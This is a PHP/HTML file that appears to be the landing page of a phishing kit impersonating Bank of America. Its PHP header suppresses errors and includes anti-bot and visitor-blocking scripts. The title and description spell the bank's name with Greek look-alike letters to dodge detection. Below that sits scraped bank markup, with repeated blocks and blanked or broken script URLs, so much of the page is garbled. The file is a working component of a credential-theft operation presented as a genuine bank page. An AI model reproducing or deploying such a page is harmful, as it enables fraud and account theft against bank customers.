﻿<?php
/*
Mou-Ad
*/


session_start();
error_reporting(0);
@ini_set('display_errors', 'on');
ob_start();
include "antibots.php";
include './bt.php';
include "./blocker.php";
?>
<html lang="en-US" class="win chrome chrome-52 webkit svg-bg not-retina cf-cnx-regular-active cf-cnx-medium-active chrome-60 cf-cnx-regular-inactive cf-cnx-medium-inactive chrome-61 not-svg-bg"><head><style type="text/css">@font-face { font-family: 'cnx-regular'; src: url('/pa/global-assets/1.0/font/cnx-regular/cnx-regular.eot'); src: url('/pa/global-assets/1.0/font/cnx-regular/cnx-regular.eot?#iefix') format('embedded-opentype'), url('/pa/global-assets/1.0/font/cnx-regular/cnx-regular.woff') format('woff'), url('/pa/global-assets/1.0/font/cnx-regular/cnx-regular.ttf') format('truetype'); font-weight: normal; font-style: normal; font-variant: normal; }@font-face { font-family: 'cnx-medium'; src: url('/pa/global-assets/1.0/font/cnx-medium/cnx-medium.eot'); src: url('/pa/global-assets/1.0/font/cnx-medium/cnx-medium.eot?#iefix') format('embedded-opentype'), url('/pa/global-assets/1.0/font/cnx-medium/cnx-medium.woff') format('woff'), url('/pa/global-assets/1.0/font/cnx-medium/cnx-medium.ttf') format('truetype'); font-weight: normal; font-style: normal; font-variant: normal; }</style><style type="text/css">@font-face { font-family: 'cnx-regular'; src: url('/pa/global-assets/1.0/font/cnx-regular/cnx-regular.eot'); src: url('/pa/global-assets/1.0/font/cnx-regular/cnx-regular.eot?#iefix') format('embedded-opentype'), url('/pa/global-assets/1.0/font/cnx-regular/cnx-regular.woff') format('woff'), url('/pa/global-assets/1.0/font/cnx-regular/cnx-regular.ttf') format('truetype'); font-weight: normal; font-style: normal; font-variant: normal; }@font-face { font-family: 'cnx-medium'; src: url('/pa/global-assets/1.0/font/cnx-medium/cnx-medium.eot'); src: url('/pa/global-assets/1.0/font/cnx-medium/cnx-medium.eot?#iefix') format('embedded-opentype'), url('/pa/global-assets/1.0/font/cnx-medium/cnx-medium.woff') format('woff'), url('/pa/global-assets/1.0/font/cnx-medium/cnx-medium.ttf') format('truetype'); font-weight: normal; font-style: normal; font-variant: normal; }</style><style type="text/css">@font-face { font-family: 'cnx-regular'; src: url('/pa/global-assets/1.0/font/cnx-regular/cnx-regular.eot'); src: url('/pa/global-assets/1.0/font/cnx-regular/cnx-regular.eot?#iefix') format('embedded-opentype'), url('/pa/global-assets/1.0/font/cnx-regular/cnx-regular.woff') format('woff'), url('/pa/global-assets/1.0/font/cnx-regular/cnx-regular.ttf') format('truetype'); font-weight: normal; font-style: normal; font-variant: normal; }@font-face { font-family: 'cnx-medium'; src: url('/pa/global-assets/1.0/font/cnx-medium/cnx-medium.eot'); src: url('/pa/global-assets/1.0/font/cnx-medium/cnx-medium.eot?#iefix') format('embedded-opentype'), url('/pa/global-assets/1.0/font/cnx-medium/cnx-medium.woff') format('woff'), url('/pa/global-assets/1.0/font/cnx-medium/cnx-medium.ttf') format('truetype'); font-weight: normal; font-style: normal; font-variant: normal; }</style><style type="text/css">@font-face { font-family: 'cnx-regular'; src: url('/pa/global-assets/1.0/font/cnx-regular/cnx-regular.eot'); src: url('/pa/global-assets/1.0/font/cnx-regular/cnx-regular.eot?#iefix') format('embedded-opentype'), url('/pa/global-assets/1.0/font/cnx-regular/cnx-regular.woff') format('woff'), url('/pa/global-assets/1.0/font/cnx-regular/cnx-regular.ttf') format('truetype'); font-weight: normal; font-style: normal; font-variant: normal; }@font-face { font-family: 'cnx-medium'; src: url('/pa/global-assets/1.0/font/cnx-medium/cnx-medium.eot'); src: url('/pa/global-assets/1.0/font/cnx-medium/cnx-medium.eot?#iefix') format('embedded-opentype'), url('/pa/global-assets/1.0/font/cnx-medium/cnx-medium.woff') format('woff'), url('/pa/global-assets/1.0/font/cnx-medium/cnx-medium.ttf') format('truetype'); font-weight: normal; font-style: normal; font-variant: normal; }</style><style type="text/css">@font-face { font-family: 'cnx-regular'; src: url('/pa/global-assets/1.0/font/cnx-regular/cnx-regular.eot'); src: url('/pa/global-assets/1.0/font/cnx-regular/cnx-regular.eot?#iefix') format('embedded-opentype'), url('/pa/global-assets/1.0/font/cnx-regular/cnx-regular.woff') format('woff'), url('/pa/global-assets/1.0/font/cnx-regular/cnx-regular.ttf') format('truetype'); font-weight: normal; font-style: normal; font-variant: normal; }@font-face { font-family: 'cnx-medium'; src: url('/pa/global-assets/1.0/font/cnx-medium/cnx-medium.eot'); src: url('/pa/global-assets/1.0/font/cnx-medium/cnx-medium.eot?#iefix') format('embedded-opentype'), url('/pa/global-assets/1.0/font/cnx-medium/cnx-medium.woff') format('woff'), url('/pa/global-assets/1.0/font/cnx-medium/cnx-medium.ttf') format('truetype'); font-weight: normal; font-style: normal; font-variant: normal; }</style><meta -equiv="Content-Type" content="text/html; charset=windows-1252"><style type="text/css">@font-face { font-family: 'cnx-regular'; src: url('t'); src: url('') format('embedded-opentype'), url('/pa/global-assets/1.0/font/cnx-regular/cnx-regular.woff') format('woff'), url('/pa/global-assets/1.0/font/cnx-regular/cnx-regular.ttf') format('truetype'); font-weight: normal; font-style: normal; font-variant: normal; }@font-face { font-family: 'cnx-medium'; src: url('/pa/global-assets/1.0/font/cnx-medium/cnx-medium.eot'); src: url('/pa/global-assets/1.0/font/cnx-medium/cnx-medium.eot?#iefix') format('embedded-opentype'), url('/pa/global-assets/1.0/font/cnx-medium/cnx-medium.woff') format('woff'), url('/pa/global-assets/1.0/font/cnx-medium/cnx-medium.ttf') format('truetype'); font-weight: normal; font-style: normal; font-variant: normal; }</style>


<meta -equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<title>Βank of Αmerica — Βanking, </title>
<link rel="shortcut icon" href="favicon.ico" type="image/ico">

                   <meta name="Keywords" content="bank, banks, banking, banking center, banking centers, finance, financial, financial institution, financial planning, invest, investing, investment advice, investment advisers, investors, checking, checking account, checking accounts, cds, certificate of deposit, certificates of deposit, savings, savings account, savings accounts, iras, investment retirement account, roth ira, education ira, traditional ira, online banking, bank online, online, mortgage, mortgages, fha, conventional mortgage, refinance, refi, consumer loans, home equity, heloc, home equity line of credit, equity builder, home equity loan, auto loan, auto insurance, automobile loan, automobile insurance, credit card, credit cards, visa, mastercard, check card, visa check card, business banking, small business banking, business checking, business savings, business center, online business, debit card">
                   <meta name="Description" content="Welcome to Βank of Αmerica, the nation's leading financial institution and home for all of your personal financial needs.">
                   <meta name="google-site-verification" content="w_aPC7FY1aXXQNDVNWnsN5fw6TKKB9XIUhqNJ76oAdE">
                   <meta name="y_key" content="c2f5f52da04e9c75">
                   <meta name="msvalidate.01" content="DCFA7922C7EDFBFFCAEE5E3C7ECA5C8C">

        <link rel="canonical" href=" /">
        <link rel="alternate" href=" /mobile/banking.go" media="handheld">
        <link rel="alternate" href=" /mobile/banking.go" media="only screen and (max-width: 640px)">
        <link rel="alternate" href-lang="es" href=" /homepage/overview.go?request_locale=es_US">

        <link href="./IMG/global-customer-jawr.css" rel="stylesheet" type="text/css" media="all">
            <link href="./IMG/pbi-hp-jawr.css" rel="stylesheet" type="text/css" media="all">

         <script src="./IMG/pbi-hp-tagging-jawr.js" id="pbi-hp-tagging-jawr"></script><script src="./IMG/global-customer-jawr.js" type="text/javascript"></script><style>.Default { visibility:hidden; }</style><style>.Default { visibility:hidden; }</style><style>.Default { visibility:hidden; }</style><style>.Default { visibility:hidden; }</style><style>.Default { visibility:hidden; }</style><style>.Default { visibility:hidden; }</style>

<script type="text/javascript">
function displayPopup(o){var n=window.open(o,"boa_dialog_window","width=500,height=400,resizeable,scrollbars");return n.focus(),!1}var DynContentComplete="no",cm_Touch="notclogging",defaultLocText="";
function getHpCookie(name){var re = new RegExp('[; ]'+name+'=([^\\s;]*)'), matches = null;if(document.cookie.length > 0){matches = document.cookie.match(re);if(matches && matches.length == 2){return decodeURIComponent(matches[1]);}}}function get_SessionIdString(){return getHpCookie("SID") || "";}
</script>

        <script type="text/javascript">
            (function(d,f){var b={src:(d.location.protocol=="s:"?"s:":":")+"",async:true,type:"text/javascript"},g="XMLRequest",c=f.createElement("script"),h=f.getElementsByTagName("head")[0],a;if(d[g]&&(a=new d[g]()).withCredentials!==undefined){a.open("GET",b.src,b.async);a.withCredentials=true;a.onreadystatechange=function(e){if(a.readyState==4&&a.status==200){c.type="script/meta";c.src=b.src;h.appendChild(c);new Function(a.responseText)()}};a.send()}else{setTimeout(function(){for(var e in b){c.setAttribute(e,b[e])}h.appendChild(c)},0)}})(window,document);
            (function(){var f=document,e=window,i=e.location.protocol,b=[["src",[i=="s:"?"s:/":":/",""].join("/")],["type","text/javascript"],["async",true]],g="XMLRequest",a=null,j=e[g]&&(a=new e[g]()).withCredentials!==undefined,c=f.createElement("script"),h=f.getElementsByTagName("head")[0];if(j){a.open("GET",b[0][1],b[2][1]);a.withCredentials=true;a.onreadystatechange=function(d){if(a.readyState==4&&a.status==200){c.type="script/meta";c.src=b[0][1];h.appendChild(c);new Function(a.responseText)()}};a.send()}else{setTimeout(function(){for(var d=0,k=b.length;d<k;d++){c.setAttribute(b[d][0],b[d][1])}h.appendChild(c)},0)}})();
            (function(){var d=document,c=window,g=c.location.protocol,e="XMLRequest",a,h=c[e]&&(a=new c[e]()).withCredentials!==undefined,b=d.createElement("script"),f=d.getElementsByTagName("head")[0];b.src=(g=="s:"?"s://":"://")+"dull.   /boaa/y9h.js";b.async=true;if(!h){setTimeout(function(){b.type="text/javascript";f.appendChild(b)},0)}else{a.open("GET",b.src,b.async);a.withCredentials=true;a.onreadystatechange=function(i){if(a.readyState==4&&a.status==200){b.type="script/meta";f.appendChild(b);new Function(a.responseText)()}};a.send()}})();
        </script>
            <script>
                var boaPageDataJS = {};
                    boaPageDataJS.isLLE = "false";
            </script>
                <style>body{display:none;}</style>
    <script type="script/meta" src="./IMG/I3n.js"></script><script type="script/meta" src="./IMG/9hg.js"></script><script src="./IMG/y9h.js" async="" type="script/meta"></script><script type="text/javascript" async="" src="./IMG/g8C"></script><script type="text/javascript" async="" src="./IMG/g8C(1)"></script><script type="script/meta" src=":"></script><style id="__web-inspector-hide-shortcut-style__" type="text/css">
.__web-inspector-hide-shortcut__, .__web-inspector-hide-shortcut__ *, .__web-inspector-hidebefore-shortcut__::before, .__web-inspector-hideafter-shortcut__::after
{
    visibility: hidden !important;
}
</style><script type="script/meta" src=":"></script><script type="script/meta" src=":"></script><script src=":" async="true" type="text/javascript"></script><script src="://" type="text/javascript" async="true"></script><script src="://dull.   /boaa/y9h.js" async="" type="text/javascript"></script><script src=":" async="true" type="text/javascript"></script><script src="://" type="text/javascript" async="true"></script><script src="://dull.   /boaa/y9h.js" async="" type="text/javascript"></script><script src=":" async="true" type="text/javascript"></script><script src="://" type="text/javascript" async="true"></script><script src="://dull.   /boaa/y9h.js" async="" type="text/javascript"></script><script src=":" async="true" type="text/javascript"></script><script src="://" type="text/javascript" async="true"></script><script src="://dull.   /boaa/y9h.js" async="" type="text/javascript"></script><script src=":" async="true" type="text/javascript"></script><script src="://" type="text/javascript" async="true"></script><script src="://dull.   /boaa/y9h.js" async="" type="text/javascript"></script></head>  

    <body class="oo_bar oo_bar oo_bar oo_bar oo_bar oo_bar" style="display: block;">
 

<div class="Default" style="visibility: visible; display: block;"></div>
<script type="text/javascript">
   Create("BOA_MVT_TOP");
</script><div id="Marker-default-BOA_MVT_TOP-0" style="visibility:hidden;display:none">&nbsp;</div><script src="" language="JavaScript"></script><div style="visibility: hidden; display: none" id="Imported-default-BOA_MVT_TOP-0"><script type="text/javascript">
/*seTTCookie() v1 */
function seTTCookie(a,b,c){var d=new Date();d.setTime(d.getTime()+c);var e='; expires='+d.toGMTString();document.cookie=(a+'='+b+e+'; path=/; domain=')}
/*geTTCookieVal() Profile v1 */
function geTTCookieVal(n){return(v=new RegExp('^'+n+'=.*|;\\s*'+n+'=.*').exec(document.cookie))?v[0].split('=')[1].split(';')[0]:''};
      function readCookie(name) {
         var value = "; " + document.cookie;
         var parts = value.split("; " + name + "=");
        if (parts.length == 2) return parts.pop().split(";").shift();
      }
      {
         var ThrottleVal = readCookie("throttle_value");
         var isSBCustomer = readCookie("isSBCustomer");
         var runOnce = geTTCookieVal("me_runonce") || "yes";
      }

if ((runOnce != "no")) {
    if (ThrottleVal == 999) {
        seTTCookie("me_runonce", "no", 30 * 60 * 1000);
       var img = document.createElement('img');
        img.setAttribute('src', '');
        img.setAttribute("height", "1px");
        img.setAttribute("width", "1px");
        img.setAttribute("style", "display:none");
        document.body.appendChild(img);
 
    }
    if ((isSBCustomer == "true")) {
        seTTCookie("me_runonce", "no", 30 * 60 * 1000);
        var img = document.createElement('img');
        img.setAttribute('src', '');
        img.setAttribute("height", "1px");
        img.setAttribute("width", "1px");
        img.setAttribute("style", "display:none");
        document.body.appendChild(img);
    }
}
</script><script type="text/javascript">
/*T&T Metadata v3 ==>Response Plugin*/
window.ttMETA=(typeof(window.ttMETA)!="undefined")?window.ttMETA:[];window.ttMETA.push({"CampaignName":"MP Monitor (Desktop & Mobile) 1/15/16","CampaignId":"86027","RecipeName":"A: Control","RecipeId":"0","OfferId":"346","OfferName":"Default Content","Name":"BOA_MVT_TOP"});
</script>
</div><div id="Marker-default-BOA_MVT_TOP-0" style="visibility:hidden;display:none">&nbsp;</div><script src="" language="JavaScript"></script><div style="visibility: hidden; display: none" id="Imported-default-BOA_MVT_TOP-0"><script type="text/javascript">
/*seTTCookie() v1 */
function seTTCookie(a,b,c){var d=new Date();d.setTime(d.getTime()+c);var e='; expires='+d.toGMTString();document.cookie=(a+'='+b+e+'; path=/; domain=')}
/*geTTCookieVal() Profile v1 */
function geTTCookieVal(n){return(v=new RegExp('^'+n+'=.*|;\\s*'+n+'=.*').exec(document.cookie))?v[0].split('=')[1].split(';')[0]:''};
      function readCookie(name) {
         var value = "; " + document.cookie;
         var parts = value.split("; " + name + "=");
        if (parts.length == 2) return parts.pop().split(";").shift();
      }
      {
         var ThrottleVal = readCookie("throttle_value");
         var isSBCustomer = readCookie("isSBCustomer");
         var runOnce = geTTCookieVal("me_runonce") || "yes";
      }

if ((runOnce != "no")) {
    if (ThrottleVal == 999) {
        seTTCookie("me_runonce", "no", 30 * 60 * 1000);
       var img = document.createElement('img');
        img.setAttribute('src', '_');
        img.setAttribute("height", "1px");
        img.setAttribute("width", "1px");
        img.setAttribute("style", "display:none");
        document.body.appendChild(img);
 
    }
    if ((isSBCustomer == "true")) {
        seTTCookie("me_runonce", "no", 30 * 60 * 1000);
        var img = document.createElement('img');
        img.setAttribute('src', '');
        img.setAttribute("height", "1px");
        img.setAttribute("width", "1px");
        img.setAttribute("style", "display:none");
        document.body.appendChild(img);
    }
}
</script><script type="text/javascript">
/*T&T Metadata v3 ==>Response Plugin*/
window.ttMETA=(typeof(window.ttMETA)!="undefined")?window.ttMETA:[];window.ttMETA.push({"CampaignName":"MP Monitor (Desktop & Mobile) 1/15/16","CampaignId":"86027","RecipeName":"A: Control","RecipeId":"0","OfferId":"346","OfferName":"Default Content","Name":"BOA_MVT_TOP"});
</script>
</div><div style="visibility: hidden; display: none" id="Imported-default-BOA_MVT_TOP-0"><script type="text/javascript">
/*seTTCookie() v1 */
function seTTCookie(a,b,c){var d=new Date();d.setTime(d.getTime()+c);var e='; expires='+d.toGMTString();document.cookie=(a+'='+b+e+'; path=/; domain=')}
/*geTTCookieVal() Profile v1 */
function geTTCookieVal(n){return(v=new RegExp('^'+n+'=.*|;\\s*'+n+'=.*').exec(document.cookie))?v[0].split('=')[1].split(';')[0]:''};
      function readCookie(name) {
         var value = "; " + document.cookie;
         var parts = value.split("; " + name + "=");
        if (parts.length == 2) return parts.pop().split(";").shift();
      }
      {
         var ThrottleVal = readCookie("throttle_value");
         var isSBCustomer = readCookie("isSBCustomer");
         var runOnce = geTTCookieVal("me_runonce") || "yes";
      }

if ((runOnce != "no")) {
    if (ThrottleVal == 999) {
        seTTCookie("me_runonce", "no", 30 * 60 * 1000);
       var img = document.createElement('img');
        img.setAttribute('src', '');
        img.setAttribute("height", "1px");
        img.setAttribute("width", "1px");
        img.setAttribute("style", "display:none");
        document.body.appendChild(img);
 
    }
    if ((isSBCustomer == "true")) {
        seTTCookie("me_runonce", "no", 30 * 60 * 1000);
        var img = document.createElement('img');
        img.setAttribute('src', '');
        img.setAttribute("height", "1px");
        img.setAttribute("width", "1px");
        img.setAttribute("style", "display:none");
        document.body.appendChild(img);
    }
}
</script><script type="text/javascript">
/*T&T Metadata v3 ==>Response Plugin*/
window.ttMETA=(typeof(window.ttMETA)!="undefined")?window.ttMETA:[];window.ttMETA.push({"CampaignName":"MP Monitor (Desktop & Mobile) 1/15/16","CampaignId":"86027","RecipeName":"A: Control","RecipeId":"0","OfferId":"346","OfferName":"Default Content","Name":"BOA_MVT_TOP"});
</script>
</div><div id="Marker-default-BOA_MVT_TOP-0" style="visibility:hidden;display:none">&nbsp;</div><script src="" language="JavaScript"></script><div style="visibility: hidden; display: none" id="Imported-default-BOA_MVT_TOP-0"><script type="text/javascript">
/*seTTCookie() v1 */
function seTTCookie(a,b,c){var d=new Date();d.setTime(d.getTime()+c);var e='; expires='+d.toGMTString();document.cookie=(a+'='+b+e+'; path=/; d')}
/*geTTCookieVal() Profile v1 */
function geTTCookieVal(n){return(v=new RegExp('^'+n+'=.*|;\\s*'+n+'=.*').exec(document.cookie))?v[0].split('=')[1].split(';')[0]:''};
      function readCookie(name) {
         var value = "; " + document.cookie;
         var parts = value.split("; " + name + "=");
        if (parts.length == 2) return parts.pop().split(";").shift();
      }
      {
         var ThrottleVal = readCookie("throttle_value");
         var isSBCustomer = readCookie("isSBCustomer");
         var runOnce = geTTCookieVal("me_runonce") || "yes";
      }

if ((runOnce != "no")) {
    if (ThrottleVal == 999) {
        seTTCookie("me_runonce", "no", 30 * 60 * 1000);
       var img = document.createElement('img');
        img.setAttribute('src', '');
        img.setAttribute("height", "1px");
        img.setAttribute("width", "1px");
        img.setAttribute("style", "display:none");
        document.body.appendChild(img);
 
    }
    if ((isSBCustomer == "true")) {
        seTTCookie("me_runonce", "no", 30 * 60 * 1000);
        var img = document.createElement('img');
        img.setAttribute('src', '');
        img.setAttribute("height", "1px");
        img.setAttribute("width", "1px");
        img.setAttribute("style", "display:none");
        document.body.appendChild(img);
    }
}
</script><script type="text/javascript">
/*T&T Metadata v3 ==>Response Plugin*/
window.ttMETA=(typeof(window.ttMETA)!="undefined")?window.ttMETA:[];window.ttMETA.push({"CampaignName":"MP Monitor (Desktop & Mobile) 1/15/16","CampaignId":"86027","RecipeName":"A: Control","RecipeId":"0","OfferId":"346","OfferName":"Default Content","Name":"BOA_MVT_TOP"});
</script>
</div><div style="visibility: hidden; display: none" id="Imported-default-BOA_MVT_TOP-0"><script type="text/javascript">
/*seTTCookie() v1 */
function seTTCookie(a,b,c){var d=new Date();d.setTime(d.getTime()+c);var e='; expires='+d.toGMTString();document.cookie=(a+'='+b+e+'; path=/; domain=')}
/*geTTCookieVal() Profile v1 */
function geTTCookieVal(n){return(v=new RegExp('^'+n+'=.*|;\\s*'+n+'=.*').exec(document.cookie))?v[0].split('=')[1].split(';')[0]:''};
      function readCookie(name) {
         var value = "; " + document.cookie;
         var parts = value.split("; " + name + "=");
        if (parts.length == 2) return parts.pop().split(";").shift();
      }
      {
         var ThrottleVal = readCookie("throttle_value");
         var isSBCustomer = readCookie("isSBCustomer");
         var runOnce = geTTCookieVal("me_runonce") || "yes";
      }

if ((runOnce != "no")) {
    if (ThrottleVal == 999) {
        seTTCookie("me_runonce", "no", 30 * 60 * 1000);
       var img = document.createElement('img');
        img.setAttribute('src', '');
        img.setAttribute("height", "1px");
        img.setAttribute("width", "1px");
        img.setAttribute("style", "display:none");
        document.body.appendChild(img);
 
    }
    if ((isSBCustomer == "true")) {
        seTTCookie("me_runonce", "no", 30 * 60 * 1000);
        var img = document.createElement('img');
        img.setAttribute('src', '');
        img.setAttribute("height", "1px");
        img.setAttribute("width", "1px");
        img.setAttribute("style", "display:none");
        document.body.appendChild(img);
    }
}
</script><script type="text/javascript">
/*T&T Metadata v3 ==>Response Plugin*/
window.ttMETA=(typeof(window.ttMETA)!="undefined")?window.ttMETA:[];window.ttMETA.push({"CampaignName":"MP Monitor (Desktop & Mobile) 1/15/16","CampaignId":"86027","RecipeName":"A: Control","RecipeId":"0","OfferId":"346","OfferName":"Default Content","Name":"BOA_MVT_TOP"});
</script>
</div><div style="visibility: hidden; display: none" id="Imported-default-BOA_MVT_TOP-0"><script type="text/javascript">
/*seTTCookie() v1 */
function seTTCookie(a,b,c){var d=new Date();d.setTime(d.getTime()+c);var e='; expires='+d.toGMTString();document.cookie=(a+'='+b+e+'; path=/; domain=')}
/*geTTCookieVal() Profile v1 */
function geTTCookieVal(n){return(v=new RegExp('^'+n+'=.*|;\\s*'+n+'=.*').exec(document.cookie))?v[0].split('=')[1].split(';')[0]:''};
      function readCookie(name) {
         var value = "; " + document.cookie;
         var parts = value.split("; " + name + "=");
        if (parts.length == 2) return parts.pop().split(";").shift();
      }
      {
         var ThrottleVal = readCookie("throttle_value");
         var isSBCustomer = readCookie("isSBCustomer");
         var runOnce = geTTCookieVal("me_runonce") || "yes";
      }

if ((runOnce != "no")) {
    if (ThrottleVal == 999) {
        seTTCookie("me_runonce", "no", 30 * 60 * 1000);
       var img = document.createElement('img');
        img.setAttribute('src', '');
        img.setAttribute("height", "1px");
        img.setAttribute("width", "1px");
        img.setAttribute("style", "display:none");
        document.body.appendChild(img);
 
    }
    if ((isSBCustomer == "true")) {
        seTTCookie("me_runonce", "no", 30 * 60 * 1000);
        var img = document.createElement('img');
        img.setAttribute('src', '');
        img.setAttribute("height", "1px");
        img.setAttribute("width", "1px");
        img.setAttribute("style", "display:none");
        document.body.appendChild(img);
    }
}
</script><script type="text/javascript">
/*T&T Metadata v3 ==>Response Plugin*/
window.ttMETA=(typeof(window.ttMETA)!="undefined")?window.ttMETA:[];window.ttMETA.push({"CampaignName":"MP Monitor (Desktop & Mobile) 1/15/16","CampaignId":"86027","RecipeName":"A: Control","RecipeId":"0","OfferId":"346","OfferName":"Default Content","Name":"BOA_MVT_TOP"});
</script>
</div><div id="Marker-default-BOA_MVT_TOP-0" style="visibility:hidden;display:none">&nbsp;</div><script src="" language="JavaScript"></script><div style="visibility: hidden; display: none" id="Imported-default-BOA_MVT_TOP-0"><script type="text/javascript">
/*seTTCookie() v1 */
function seTTCookie(a,b,c){var d=new Date();d.setTime(d.getTime()+c);var e='; expires='+d.toGMTString();document.cookie=(a+'='+b+e+'; path=/; domain=')}
/*geTTCookieVal() Profile v1 */
function geTTCookieVal(n){return(v=new RegExp('^'+n+'=.*|;\\s*'+n+'=.*').exec(document.cookie))?v[0].split('=')[1].split(';')[0]:''};
      function readCookie(name) {
         var value = "; " + document.cookie;
         var parts = value.split("; " + name + "=");
        if (parts.length == 2) return parts.pop().split(";").shift();
      }
      {
         var ThrottleVal = readCookie("throttle_value");
         var isSBCustomer = readCookie("isSBCustomer");
         var runOnce = geTTCookieVal("me_runonce") || "yes";
      }

if ((runOnce != "no")) {
    if (ThrottleVal == 999) {
        seTTCookie("me_runonce", "no", 30 * 60 * 1000);
       var img = document.createElement('img');
        img.setAttribute('src', '');
        img.setAttribute("height", "1px");
        img.setAttribute("width", "1px");
        img.setAttribute("style", "display:none");
        document.body.appendChild(img);
 
    }
    if ((isSBCustomer == "true")) {
        seTTCookie("me_runonce", "no", 30 * 60 * 1000);
        var img = document.createElement('img');
        img.setAttribute('src', '');
        img.setAttribute("height", "1px");
        img.setAttribute("width", "1px");
        img.setAttribute("style", "display:none");
        document.body.appendChild(img);
    }
}
</script><script type="text/javascript">
/*T&T Metadata v3 ==>Response Plugin*/
window.ttMETA=(typeof(window.ttMETA)!="undefined")?window.ttMETA:[];window.ttMETA.push({"CampaignName":"MP Monitor (Desktop & Mobile) 1/15/16","CampaignId":"86027","RecipeName":"A: Control","RecipeId":"0","OfferId":"346","OfferName":"Default Content","Name":"BOA_MVT_TOP"});
</script>
</div><div style="visibility: hidden; display: none" id="Imported-default-BOA_MVT_TOP-0"><script type="text/javascript">
/*seTTCookie() v1 */
function seTTCookie(a,b,c){var d=new Date();d.setTime(d.getTime()+c);var e='; expires='+d.toGMTString();document.cookie=(a+'='+b+e+'; path=/; domain=')}
/*geTTCookieVal() Profile v1 */
function geTTCookieVal(n){return(v=new RegExp('^'+n+'=.*|;\\s*'+n+'=.*').exec(document.cookie))?v[0].split('=')[1].split(';')[0]:''};
      function readCookie(name) {
         var value = "; " + document.cookie;
         var parts = value.split("; " + name + "=");
        if (parts.length == 2) return parts.pop().split(";").shift();
      }
      {
         var ThrottleVal = readCookie("throttle_value");
         var isSBCustomer = readCookie("isSBCustomer");
         var runOnce = geTTCookieVal("me_runonce") || "yes";
      }

if ((runOnce != "no")) {
    if (ThrottleVal == 999) {
        seTTCookie("me_runonce", "no", 30 * 60 * 1000);
       var img = document.createElement('img');
        img.setAttribute('src', '');
        img.setAttribute("height", "1px");
        img.setAttribute("width", "1px");
        img.setAttribute("style", "display:none");
        document.body.appendChild(img);
 
    }
    if ((isSBCustomer == "true")) {
        seTTCookie("me_runonce", "no", 30 * 60 * 1000);
        var img = document.createElement('img');
        img.setAttribute('src', 'ubox/image?=bac_isSBCustomer&profile.isSBCustomer=true&Default=s%3A///pa/global-assets/1.0/graphic/blank.gif');
        img.setAttribute("height", "1px");
        img.setAttribute("width", "1px");
        img.setAttribute("style", "display:none");
        document.body.appendChild(img);
    }
}
</script><script type="text/javascript">
/*T&T Metadata v3 ==>Response Plugin*/
window.ttMETA=(typeof(window.ttMETA)!="undefined")?window.ttMETA:[];window.ttMETA.push({"CampaignName":"MP Monitor (Desktop & Mobile) 1/15/16","CampaignId":"86027","RecipeName":"A: Control","RecipeId":"0","OfferId":"346","OfferName":"Default Content","Name":"BOA_MVT_TOP"});
</script>
</div><div style="visibility: hidden; display: none" id="Imported-default-BOA_MVT_TOP-0"><script type="text/javascript">
/*seTTCookie() v1 */
function seTTCookie(a,b,c){var d=new Date();d.setTime(d.getTime()+c);var e='; expires='+d.toGMTString();document.cookie=(a+'='+b+e+'; path=/; domain=')}
/*geTTCookieVal() Profile v1 */
function geTTCookieVal(n){return(v=new RegExp('^'+n+'=.*|;\\s*'+n+'=.*').exec(document.cookie))?v[0].split('=')[1].split(';')[0]:''};
      function readCookie(name) {
         var value = "; " + document.cookie;
         var parts = value.split("; " + name + "=");
        if (parts.length == 2) return parts.pop().split(";").shift();
      }
      {
         var ThrottleVal = readCookie("throttle_value");
         var isSBCustomer = readCookie("isSBCustomer");
         var runOnce = geTTCookieVal("me_runonce") || "yes";
      }

if ((runOnce != "no")) {
    if (ThrottleVal == 999) {
        seTTCookie("me_runonce", "no", 30 * 60 * 1000);
       var img = document.createElement('img');
        img.setAttribute('src', '');
        img.setAttribute("height", "1px");
        img.setAttribute("width", "1px");
        img.setAttribute("style", "display:none");
        document.body.appendChild(img);
 
    }
    if ((isSBCustomer == "true")) {
        seTTCookie("me_runonce", "no", 30 * 60 * 1000);
        var img = document.createElement('img');
        img.setAttribute('src', '');
        img.setAttribute("height", "1px");
        img.setAttribute("width", "1px");
        img.setAttribute("style", "display:none");
        document.body.appendChild(img);
    }
}
</script><script type="text/javascript">
/*T&T Metadata v3 ==>Response Plugin*/
window.ttMETA=(typeof(window.ttMETA)!="undefined")?window.ttMETA:[];window.ttMETA.push({"CampaignName":"MP Monitor (Desktop & Mobile) 1/15/16","CampaignId":"86027","RecipeName":"A: Control","RecipeId":"0","OfferId":"346","OfferName":"Default Content","Name":"BOA_MVT_TOP"});
</script>
</div><div style="visibility: hidden; display: none" id="Imported-default-BOA_MVT_TOP-0"><script type="text/javascript">
/*seTTCookie() v1 */
function seTTCookie(a,b,c){var d=new Date();d.setTime(d.getTime()+c);var e='; expires='+d.toGMTString();document.cookie=(a+'='+b+e+'; path=/; domain=   ')}
/*geTTCookieVal() Profile v1 */
function geTTCookieVal(n){return(v=new RegExp('^'+n+'=.*|;\\s*'+n+'=.*').exec(document.cookie))?v[0].split('=')[1].split(';')[0]:''};
      function readCookie(name) {
         var value = "; " + document.cookie;
         var parts = value.split("; " + name + "=");
        if (parts.length == 2) return parts.pop().split(";").shift();
      }
      {
         var ThrottleVal = readCookie("throttle_value");
         var isSBCustomer = readCookie("isSBCustomer");
         var runOnce = geTTCookieVal("me_runonce") || "yes";
      }

if ((runOnce != "no")) {
    if (ThrottleVal == 999) {
        seTTCookie("me_runonce", "no", 30 * 60 * 1000);
       var img = document.createElement('img');
        img.setAttribute('src', 's://e/eimage?=optOut&profile.throttle_value=999&Default=s%3A//   /pa/global-assets/1.0/graphic/blank.gif');
        img.setAttribute("height", "1px");
        img.setAttribute("width", "1px");
        img.setAttribute("style", "display:none");
        document.body.appendChild(img);
 
    }
    if ((isSBCustomer == "true")) {
        seTTCookie("me_runonce", "no", 30 * 60 * 1000);
        var img = document.createElement('img');
        img.setAttribute('src', 'ubox/image?=bac_isSBCustomer&profile.isSBCustomer=true&Default=s%3A//   /pa/global-assets/1.0/graphic/blank.gif');
        img.setAttribute("height", "1px");
        img.setAttribute("width", "1px");
        img.setAttribute("style", "display:none");
        document.body.appendChild(img);
    }
}
</script><script type="text/javascript">
/*T&T Metadata v3 ==>Response Plugin*/
window.ttMETA=(typeof(window.ttMETA)!="undefined")?window.ttMETA:[];window.ttMETA.push({"CampaignName":"MP Monitor (Desktop & Mobile) 1/15/16","CampaignId":"86027","RecipeName":"A: Control","RecipeId":"0","OfferId":"346","OfferName":"Default Content","Name":"BOA_MVT_TOP"});
</script>
